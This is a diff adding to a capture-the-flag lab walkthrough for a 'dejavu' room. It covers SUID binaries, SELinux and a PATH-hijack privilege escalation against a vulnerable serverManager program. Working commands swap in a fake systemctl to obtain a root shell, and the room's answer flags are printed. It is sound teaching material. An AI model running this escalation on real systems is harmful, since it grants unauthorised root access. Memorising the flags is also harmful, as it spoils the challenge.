@@ -191,14 +191,214 @@ msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) >
 <p><em>Answer the questions below</em></p>
 
 <p>4.1. Generate an image payload with Metasploit<br>
-<code>No answer needed</p>
+<code>No answer needed</code></p>
 
 <p>4.2. Get code execution on the target machine<br>
-<code>No answer needed</p>
+<code>No answer needed</code></p>
 
 <p>4.3. Retrieve the flag located in /home/dogpics/user.txt. What is the user flag?<br>
-<code>dejavu{735c0553063625f41879e57d5b4f3352}</p>
+<code>dejavu{735c0553063625f41879e57d5b4f3352}</code>code></p>
 
+<h2>Task 5 . Privilege Escalation - Enumeration and PATH Exploitation</h2>
+<h3>Privesc Enumeration</h3>
+<p>Now that we have code execution, our goal should be rooting the box. Fortunately, something should immediately catch your attention if you run ls -lah from the current working directory. A SUID binary! The presence of one of these in a home directory is quite unusual, but it looks like we have a file left by the server administrator to help manage the webserver. It also looks like we have the source code for this C program, very useful for exploiting it.</p>
+
+<h3>A note on SELinux</h3>
+<p>SELinux improves security by essentially setting out rules that processes are made to follow.<br>
+While SELinux can make hacking a box more difficult, it can also make administering a server more difficult.<br>
+
+Rather than trying to configure SELinux to allow the webserver to bind to port 80, the system administrator just disabled it. This is a somewhat common approach, but is by no means the "correct" approach which would be learning the fundamentals of SELinux and configuring it correctly. With the command getenforce we can verify whether SELinux is enforcing its rules (the command prints disabled).<br>
+
+While SELinux doesn't affect the privesc we use here, it is worth bearing in mind in real pentests or harder rooms.<br>
+
+You can read more about SELinux at these links:<br>
+
+- https://selinuxproject.org/page/FAQ<br>
+- https://www.redhat.com/en/topics/linux/what-is-selinux</p>
+
+<h3>Understanding SUID binaries</h3>
+<p>A SUID binary has special permissions, allowing the program to use the setuid system call. The setuid call allows the process to set its user id. If you call setuid(0) and the process has the correct permissions, then the program will then run as root.<br>
+
+When a program may need to run parts of the code as root but does not want to run the whole program as root, SUID is often used. An example of this would be the webserver Apache2, which initially runs as root to bind to port 80 and then subsequently drops these elevated privileges.<br>
+
+SUID binaries can only set their UID to the owner of the binary's UID unless the binary is owned by root, in which case they can set it to any UID. You usually don't have to call setuid yourself, the program will usually do this.<br>
+
+A more modern alternative to setuid binaries is Linux Capabilities, which offer much more granular control over permissions such as CAP_NET_BIND_SERVICE which allows programs to bind to low (privileged, under 1024) ports without running as root. The capability CAP_SET_UID is equivalent to  suid permissions, allowing the program to call setuid</p>
+
+<h3>What does the vulnerable binary do?</h3>
+<p>If we run the binary, with ./serverManager, we get a choice of operations.<br>
+
+Selecting 0 gives us the status of the webserver service, and 1 allows us to restart it. Restarting the service would usually require root privileges, so it makes some sense that the binary is SUID.</p>
+
+<h6>Reverse Shell</h6>
+
+```bash
+[dogpics@dejavu ~]$ ./serverManager 
+Welcome to the DogPics server manager Version 1.0
+Please enter a choice:
+0 -	Get server status
+1 -	Restart server
+0
+● dogpics.service - Dog pictures
+   Loaded: loaded (/etc/systemd/system/dogpics.service; enabled; vendor preset: disabled)
+   Active: active (running) since Sat 2021-09-11 18:00:08 BST; 19min ago
+ Main PID: 776 (webserver)
+    Tasks: 7 (limit: 5971)
+   Memory: 76.8M
+   CGroup: /system.slice/dogpics.service
+           └─776 /home/dogpics/webserver -p 80
+
+Sep 11 18:00:08 dejavu systemd[1]: Started Dog pictures.
+```
+
+<p>As we have the source code of the application, we can more easily see the vulnerability.</p>
+
+<h6>serverManager.c-vi</h6>
+
+```bash
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(void)
+{   
+    setuid(0);
+    setgid(0);
+    printf(
+        "Welcome to the DogPics server manager Version 1.0\n"
+        "Please enter a choice:\n");
+    int operation = 0;
+    printf(
+        "0 -\tGet server status\n"
+        "1 -\tRestart server\n");
+    while (operation < 48 || operation > 49) {
+        operation = getchar();
+        getchar();
+        if (operation < 48 || operation > 49) {
+            printf("Invalid choice.\n");
+        }
+    }
+    operation = operation - 48;
+    //printf("Choice was:\t%d\n",operation);
+    switch (operation)
+    {
+    case 0:
+        //printf("0\n");
+        system("systemctl status --no-pager dogpics");
+        break;
+    case 1:
+        system("sudo systemctl restart dogpics");
+        break;
+    default:
+        break;
+    }
+}
+```
+
+<p>The vulnerability comes from calling system() without providing a full path to the binary. This means that we can create a fake systemctl binary which will run as root, and escalate our privileges.<br>
+
+We can also use a program called ltrace which allows us to see system and library calls, although this is not installed on the machine. Pay close attention to the system() seen earlier that provides systemctl without its full path. </p>
+
+<h6>james@centos</h6>
+
+```bash
+[james@centos]$ ltrace -b -a 100 ./serverManager
+setuid(0)                                                                                          = -1
+setgid(0)                                                                                          = -1
+puts("Welcome to the DogPics server ma"...Welcome to the DogPics server manager Version 1.0
+Please enter a choice:
+)                                                        = 73
+puts("0 -\tGet server status\n1 -\tRestar"...0 -        Get server status
+1 -     Restart server
+)                                                     = 41
+getchar(0, 0x25d62a0, 0x7f8d48b99860, 0x7f8d488c56480
+)                                              = 48
+getchar(0, 0x25d66b0, 0x25d66b1, 0x7f8d488c55a5)                                                   = 10
+system("systemctl status --no-pager dogp"...● dogpics.service - Dog pictures
+   Loaded: loaded (/etc/systemd/system/dogpics.service; enabled; vendor preset: disabled)
+   Active: active (running) since Sat 2021-09-11 18:28:17 BST; 6min ago
+ Main PID: 894 (webserver)
+    Tasks: 6 (limit: 24819)
+   Memory: 17.9M
+   CGroup: /system.slice/dogpics.service
+           └─894 /home/dogpics/webserver -p 80
+)                                                      = 0
+```
+
+<h3>Explaining the PATH variable</h3>
+<p>The PATH variable tells the shell where to look for binaries that you call by name, so for example ls is actually /bin/ls. It consists of a sequence of directories, separated by colons. Your shell will run the first binary that matches, looking in each directory left to right. This direction is important.</p>
+
+<h3>What are we exploiting?</h3>
+<p>We're exploiting a combination of two things here.<br>
+
+Firstly, the binary runs as root due to SUID.<br>
+
+Secondly, the binary calls systemctl with an incomplete path (eg not /usr/bin/systemctl, just systemctl on it's own.)<br>
+
+Because the system will run the first binary it finds from PATH that matches systemctl here, we can make our own fake systemctl to run instead, which will be ran as root (as it inherits the UID and GID of the parent process).<br>
+
+Our fake systemctl can be as simple as /bin/bash in plaintext to start a new shell - Linux treats executable text files as shell scripts.<br>
+
+Let's create a fake systemctl, add it to path, and get root.</p>
+
+<h6>Reverse Shell</h6>
+
+```bash
+[dogpics@dejavu ~]$ which systemctl
+/usr/bin/systemctl
+[dogpics@dejavu ~]$ echo '/bin/bash' > systemctl
+[dogpics@dejavu ~]$ chmod +x systemctl
+[dogpics@dejavu ~]$ export PATH=.:$PATH
+[dogpics@dejavu ~]$ which systemctl
+./systemctl
+[dogpics@dejavu ~]$ ./serverManager 
+Welcome to the DogPics server manager Version 1.0
+Please enter a choice:
+0 -	Get server status
+1 -	Restart server
+0
+[root@dejavu ~]# whoami
+root
+```
+
+<p>Let's break this down:<br>
+
+[dogpics@dejavu ~]$ echo '/bin/bash' > systemctl - We're creating a plaintext file with the contents /bin/bash which will start a shell when executed.<br>
+
+[dogpics@dejavu ~]$ chmod +x systemctl - We need to make our fake systemctl executable, otherwise it will be ignored.<br>
+
+[dogpics@dejavu ~]$ export PATH=.:$PATH - here, we add . (our current working directory) to the beginning of PATH. This means the system will look in our current working directory for binaries before searching the rest of PATH, and find our fake systemctl before the genuine one.<br>
+
+[dogpics@dejavu ~]$ which systemctl - To check that our fake systemctl will run if the command systemctl is used, we use which. which essentially does the PATH lookup for us and prints the results.<br>
+
+[dogpics@dejavu ~]$ ./serverManager - Run the vulnerable binary!<br>
+
+From there, you should have a root shell. As a warning, your HOME variable is still /home/dogpics rather than /root so you will need to cd /root. Then just grab the flag.</p>
+
+<h3>Further reading on this method</h3>
+<p>https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</p>
+
+
+<p><em>Answer the questions below</em></p>
+
+<p>5.1. Stabilise your reverse shell to ensure that you can run interactive binaries<br>
+<code>No answer needed/code></p>
+
+<p>5.2. WFind the SUID binary<br>
+<code>No answer needed</code></p>
+
+<p>5.3. Verify (based on output) that the serverManager program runs systemctl when you run it.
+Try running the same command as the binary yourself - systemctl status dogpics --no-pagerbr>
+<code>No answer needed</code></p>
+
+<p>5.4. Create your fake systemctl, ensure it's correctly added to PATH, and escalate your privileges.<br>
+<code>No answer needed</code>
+
+<p>5.5. Retrieve the root flag from /root/root.txt. What is the root flag?<br>
+<code>dejavu{5ad931368bdc46f856febe4834ace627}</code>
+
+<br>
+<br>
 
 ```bash
 msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > run
